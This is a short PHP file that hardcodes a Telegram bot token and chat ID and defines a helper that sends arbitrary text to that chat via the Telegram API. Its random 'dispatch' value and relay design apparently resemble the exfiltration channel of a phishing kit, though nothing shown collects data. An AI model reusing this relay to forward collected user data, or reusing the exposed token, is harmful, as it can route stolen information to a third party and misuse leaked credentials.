<?php
$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);
$token = "1772616517:AAFK_yeKbgknINNDEG5jyVNw6yI-dcy4h3Y";
$chatid = "-534187156";
	function sendMessage($chatID, $messaggio, $token) {

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
?>